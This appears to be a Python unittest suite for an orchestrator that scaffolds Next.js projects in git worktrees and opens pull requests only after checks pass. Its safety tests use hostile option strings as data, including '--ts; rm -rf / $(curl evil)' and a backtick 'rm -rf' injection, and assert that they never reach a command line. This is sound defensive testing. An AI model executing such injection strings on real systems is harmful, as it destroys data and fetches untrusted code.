import builtins
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from compass.orchestrator import generate as gen
from compass.orchestrator.generate_contract import Caller, GenerateRequest, Repo


def _git(cwd, *args):
    subprocess.run(["git", "-C", str(cwd), *args], check=True, capture_output=True, text=True)


class Fixture(unittest.TestCase):
    """A real git repo with one commit and a bare origin, in a temp dir. Nothing touches $HOME."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.origin = self.root / "origin.git"
        self.checkout = self.root / "app"
        self.handoff = self.root / "handoff"
        os.environ["COMPASS_HANDOFF_DIR"] = str(self.handoff)
        subprocess.run(["git", "init", "--bare", "-b", "main", str(self.origin)], check=True, capture_output=True)
        subprocess.run(["git", "init", "-b", "main", str(self.checkout)], check=True, capture_output=True)
        _git(self.checkout, "config", "user.email", "t@t")
        _git(self.checkout, "config", "user.name", "t")
        (self.checkout / "README.md").write_text("empty repo\n")
        _git(self.checkout, "add", "-A")
        _git(self.checkout, "commit", "-m", "init")
        _git(self.checkout, "remote", "add", "origin", str(self.origin))
        _git(self.checkout, "push", "-u", "origin", "main")
        self.calls = []  # every argv the fake runner saw, in order

    def tearDown(self):
        os.environ.pop("COMPASS_HANDOFF_DIR", None)
        self._tmp.cleanup()

    def request(self, **over):
        base = dict(
            framework="nextjs-ts",
            repo=Repo(key="app", local_path=str(self.checkout)),
            subject_ref="app",
            options="app router, tailwind",
            caller=Caller(kind="ts", handoff_call_id="call-1"),
            checks=None,
        )
        base.update(over)
        return GenerateRequest(**base)

    def make_worktree(self, project, branch):
        """Stands in for `_ensure_work_worktree`: a fresh worktree on a new branch, off HEAD."""
        wt = self.root / "wt" / branch.replace("/", "__")
        wt.parent.mkdir(parents=True, exist_ok=True)
        r = subprocess.run(["git", "-C", str(project), "worktree", "add", "-b", branch, str(wt)],
                           capture_output=True, text=True)
        return wt if r.returncode == 0 else None

    def runner(self, generator_ok=True, generator_writes=True, check_rc=0):
        """Fake the generator (npx) and the checks; run every other command for real via `sh`."""
        def run(argv, cwd, timeout):
            self.calls.append(list(argv))
            if argv[0] == "npx":
                if generator_writes:
                    (Path(cwd) / "package.json").write_text("{}\n")
                    (Path(cwd) / "app").mkdir(exist_ok=True)
                    (Path(cwd) / "app" / "page.tsx").write_text("export default null\n")
                rc = 0 if generator_ok else 3
                return subprocess.CompletedProcess(argv, rc, "generated" if rc == 0 else "", "boom" if rc else "")
            if argv[0] == "sh":
                # `true` and `false` run for real; any other check is a stand-in that passes unless
                # the test asks for a failing check through check_rc.
                if argv[-1] in ("true", "false"):
                    return subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=timeout)
                return subprocess.CompletedProcess(argv, check_rc, "", "check failed" if check_rc else "")
            return subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=timeout)
        return run

    def pr(self, url="https://github.com/o/r/pull/7"):
        opened = []

        def open_pr(exec_dir, branch, body):
            opened.append((branch, body))
            return url
        open_pr.opened = opened
        return open_pr


class ShippedAndFailures(Fixture):
    def test_green_run_ships_with_a_pr(self):
        open_pr = self.pr()
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(),
                             open_pr=open_pr, make_worktree=self.make_worktree)
        self.assertEqual(r.status, "shipped")
        self.assertEqual(r.pr_url, "https://github.com/o/r/pull/7")
        self.assertEqual(r.branch, "feat/scaffold-app")
        self.assertEqual(r.files_changed, 2)
        self.assertEqual(r.checks.ran, ("true",))
        self.assertEqual(len(open_pr.opened), 1)
        self.assertTrue(Path(r.log_ref).exists())

    def test_default_checks_come_from_the_stack_when_none_given(self):
        r = gen.run_generate(self.request(), runner=self.runner(), open_pr=self.pr(),
                             make_worktree=self.make_worktree)
        self.assertEqual(r.status, "shipped")
        self.assertEqual(list(r.checks.ran), list(gen.STACKS["nextjs-ts"].default_checks))

    def test_failed_check_opens_no_pr(self):
        open_pr = self.pr()
        r = gen.run_generate(self.request(checks=["false"]), runner=self.runner(),
                             open_pr=open_pr, make_worktree=self.make_worktree)
        self.assertEqual(r.status, "checks_failed")
        self.assertEqual(r.checks.failed, "false")
        self.assertIsNone(r.pr_url)
        self.assertEqual(open_pr.opened, [], "a PR is only ever opened on green")

    def test_generator_nonzero_exit_is_generator_failed(self):
        open_pr = self.pr()
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(generator_ok=False),
                             open_pr=open_pr, make_worktree=self.make_worktree)
        self.assertEqual(r.status, "generator_failed")
        self.assertIn("exited 3", r.refusal)
        self.assertEqual(open_pr.opened, [])

    def test_no_files_produced_is_generator_failed_not_shipped(self):
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(generator_writes=False),
                             open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "generator_failed")
        self.assertIn("no files", r.refusal)

    def test_green_checks_with_no_pr_is_not_shipped(self):
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(),
                             open_pr=self.pr(url=None), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "generator_failed")
        self.assertIn("no pull request", r.refusal)


class Refusals(Fixture):
    def test_missing_checkout_is_refused(self):
        r = gen.run_generate(self.request(repo=Repo(key="app", local_path=str(self.root / "nope")), checks=["true"]),
                             runner=self.runner(), open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "refused")
        self.assertIn("does not exist", r.refusal)
        self.assertEqual(self.calls, [], "nothing spawned for a refused run")

    def test_plain_directory_is_refused(self):
        plain = self.root / "plain"
        plain.mkdir()
        r = gen.run_generate(self.request(repo=Repo(key="app", local_path=str(plain)), checks=["true"]),
                             runner=self.runner(), open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "refused")
        self.assertIn("not a git repository", r.refusal)

    def test_worktree_that_cannot_be_made_is_refused(self):
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(), open_pr=self.pr(),
                             make_worktree=lambda project, branch: None)
        self.assertEqual(r.status, "refused")
        self.assertIn("worktree", r.refusal)

    def test_non_empty_checkout_is_refused_as_not_greenfield(self):
        def dirty(project, branch):
            wt = Path(self.make_worktree(project, branch))
            (wt / "leftover.txt").write_text("from a prior attempt\n")
            return wt
        r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(), open_pr=self.pr(),
                             make_worktree=dirty)
        self.assertEqual(r.status, "refused")
        self.assertIn("not empty", r.refusal)
        self.assertEqual([c for c in self.calls if c[0] == "npx"], [], "generator never ran over leftovers")


class Safety(Fixture):
    def test_options_text_never_reaches_a_command_line(self):
        hostile = "--ts; rm -rf / $(curl evil)"
        gen.run_generate(self.request(options=hostile, checks=["true"]), runner=self.runner(),
                         open_pr=self.pr(), make_worktree=self.make_worktree)
        for argv in self.calls:
            self.assertNotIn(hostile, " ".join(argv))
            self.assertNotIn("evil", " ".join(argv))

    def test_options_are_recorded_in_the_pr_body(self):
        open_pr = self.pr()
        gen.run_generate(self.request(options="app router, tailwind", checks=["true"]),
                         runner=self.runner(), open_pr=open_pr, make_worktree=self.make_worktree)
        self.assertIn("app router, tailwind", open_pr.opened[0][1])

    def test_generator_reads_nothing_from_the_framework_folder(self):
        framework_markers = ("/compass/agents", "/compass/workflows", "/compass/seed",
                             "/compass/templates", "/compass/orchestrator/graph", "config.yaml")
        real_open = builtins.open
        seen = []

        def guarded(file, mode="r", *a, **kw):
            path = str(file)
            if "r" in mode and any(m in path for m in framework_markers):
                seen.append(path)
                raise AssertionError(f"generator read a framework file: {path}")
            return real_open(file, mode, *a, **kw)

        with mock.patch("builtins.open", guarded):
            r = gen.run_generate(self.request(checks=["true"]), runner=self.runner(),
                                 open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "shipped")
        self.assertEqual(seen, [])

    def test_module_does_not_import_the_graph_or_run(self):
        src = Path(gen.__file__).read_text()
        self.assertNotIn("from .run ", src)
        self.assertNotIn("from .graph", src)
        self.assertNotIn("import run", src)


class Merge(Fixture):
    """The generator writes into a scratch directory; its output is merged into the checkout."""

    def runner_writing(self, files):
        def run(argv, cwd, timeout):
            self.calls.append(list(argv))
            if argv[0] == "npx":
                for name, body in files.items():
                    (Path(cwd) / name).write_text(body)
                return subprocess.CompletedProcess(argv, 0, "", "")
            if argv[0] == "sh":
                return subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=timeout)
            return subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=timeout)
        return run

    def test_the_repos_own_readme_is_kept_when_the_generator_writes_one(self):
        r = gen.run_generate(self.request(checks=["true"]),
                             runner=self.runner_writing({"README.md": "generator readme\n", "package.json": "{}\n"}),
                             open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "shipped")
        wt = self.root / "wt" / "feat__scaffold-app"
        self.assertEqual((wt / "README.md").read_text(), "empty repo\n")
        self.assertEqual((wt / "package.json").read_text(), "{}\n")

    def test_a_repo_that_already_has_a_project_file_is_refused_before_the_generator_runs(self):
        (self.checkout / "package.json").write_text("{\"name\": \"mine\"}\n")
        _git(self.checkout, "add", "-A")
        _git(self.checkout, "commit", "-m", "add package.json")
        _git(self.checkout, "push", "origin", "main")
        runner = self.runner_writing({"package.json": "{}\n"})
        r = gen.run_generate(self.request(checks=["true"]), runner=runner,
                             open_pr=self.pr(), make_worktree=self.make_worktree)
        self.assertEqual(r.status, "refused")
        self.assertIn("not empty", r.refusal)
        self.assertEqual([c for c in self.calls if c[0] == "npx"], [])
        self.assertEqual((self.root / "wt" / "feat__scaffold-app" / "package.json").read_text(), "{\"name\": \"mine\"}\n")

class CheckEnvironment(Fixture):
    def test_the_app_process_node_env_is_not_handed_to_the_generated_project(self):
        with mock.patch.dict(os.environ, {"NODE_ENV": "development", "PATH": os.environ.get("PATH", "")}):
            env = gen._check_env()
        self.assertNotIn("NODE_ENV", env)
        self.assertIn("PATH", env)

    def test_turbopack_the_dev_servers_own_runtime_signal_is_not_handed_down(self):
        # Live: a dev server started with `next dev --turbopack` sets TURBOPACK=1 on its OWN process
        # (next/dist does this at runtime, not from the shell). A generated project's `next build`
        # inherited it and ran under Turbopack, which failed to prerender /404 — confirmed by setting
        # only this variable and reproducing the exact error.
        with mock.patch.dict(os.environ, {"TURBOPACK": "1"}):
            self.assertNotIn("TURBOPACK", gen._check_env())

    def test_every_NEXT_prefixed_variable_is_dropped_as_the_frameworks_own_state(self):
        with mock.patch.dict(os.environ, {"NEXT_PHASE": "phase-production-build", "NEXT_DEPLOYMENT_ID": "x"}):
            env = gen._check_env()
        self.assertNotIn("NEXT_PHASE", env)
        self.assertNotIn("NEXT_DEPLOYMENT_ID", env)

    def test_commands_come_only_from_the_stack_table_or_the_request_checks(self):
        ran = []
        def runner(argv, cwd, timeout):
            ran.append(list(argv))
            if argv[0] == "npx":
                (Path(cwd) / "package.json").write_text("{}\n")
                return subprocess.CompletedProcess(argv, 0, "", "")
            return subprocess.CompletedProcess(argv, 0, "", "")
        gen.run_generate(self.request(options="run `rm -rf /tmp/x` then build"),
                         runner=runner, open_pr=self.pr(), make_worktree=self.make_worktree)
        shell = [c[2] for c in ran if c[0] == "sh"]
        self.assertEqual(shell, list(gen.STACKS["nextjs-ts"].default_checks))
        self.assertFalse(any("rm -rf" in " ".join(c) for c in ran))


class Wire(Fixture):
    def test_generate_json_round_trips_through_the_contract(self):
        fixture = {
            "version": 1, "framework": "nextjs-ts",
            "repo": {"key": "app", "local_path": str(self.root / "nope")},
            "subject_ref": "app", "options": "",
            "caller": {"kind": "ts", "handoff_call_id": "call-2"},
        }
        out = gen.generate_json(fixture)
        self.assertEqual(out["version"], 1)
        self.assertEqual(out["status"], "refused")
        self.assertIsNone(out["usage"])


if __name__ == "__main__":
    unittest.main()
